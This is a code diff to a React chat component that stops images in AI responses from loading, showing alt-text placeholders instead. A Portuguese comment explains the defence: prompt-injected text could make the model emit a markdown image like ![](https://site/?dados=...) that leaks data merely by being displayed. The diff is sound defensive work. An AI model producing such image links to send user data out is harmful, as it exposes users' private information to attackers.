@@ -1101,6 +1101,10 @@ export function UIChat({
                                                         a: (props) => (
                                                             <a className="text-primary-300 underline underline-offset-2" target="_blank" rel="noreferrer" {...props} />
                                                         ),
+                                                        // Imagem na resposta da IA não carrega: um texto malicioso
+                                                        // (prompt injection) usaria ![](https://site/?dados=...) para
+                                                        // vazar dados só de exibir a resposta.
+                                                        img: ({ alt }) => <span className="italic opacity-70">{alt ? `[imagem: ${alt}]` : '[imagem]'}</span>,
                                                     }}
                                                 >
                                                     {text}
